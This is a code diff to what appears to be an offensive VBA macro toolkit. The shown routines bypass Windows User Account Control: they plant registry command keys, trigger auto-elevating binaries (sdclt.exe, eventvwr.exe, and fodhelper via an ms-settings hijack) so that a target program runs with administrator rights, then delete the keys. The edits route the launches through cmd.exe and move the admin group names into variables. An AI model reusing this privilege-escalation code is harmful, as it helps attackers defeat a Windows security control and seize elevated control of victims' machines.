@@ -17,7 +17,7 @@ Private Sub BypassUAC_Windows10 (targetPath As String)
     wshUac.RegWrite regKeyCommand2, "", "REG_SZ"
     
     'trigger the bypass
-    ExecuteCmdAsync  "C:\windows\system32\sdclt.exe"  
+    ExecuteCmdAsync  "cmd.exe /c sdclt.exe"  
     MySleep 3
     
     ' Remove keys
@@ -39,7 +39,7 @@ Private Sub BypassUAC_Other(targetPath As String)
     wshUac.RegWrite regKeyCommand, targetPath, "REG_SZ"
     
     'trigger the bypass
-    ExecuteCmdAsync  "C:\windows\system32\eventvwr.exe"  
+    ExecuteCmdAsync  "cmd.exe /c eventvwr.exe"  
     MySleep 3
     
     ' Remove keys
@@ -61,13 +61,16 @@ End Sub
 
 ' hijack ms-settings class com object to bypass UAC when fodhelper.exe is called (Windows 10)
 Sub BypassUACExec (targetPath As String)
-
+    Dim adminFr As String
+    Dim adminEn As String
+    adminFr = "Administrateurs"
+    adminEn = "Administrators"
     'Check if useful to bypass UAC (must be member of Admin group and not have admin privilege
     ' is a member of that group.
     If IsAdmin  () Then
         ExecuteCmdAsync targetPath
     Else
-        If IsMember("Administrators") or IsMember("Administrateurs") Then
+        If IsMember(adminEn) or IsMember(adminFr) Then
                BypassUAC targetPath
             Else
                ExecuteCmdAsync targetPath
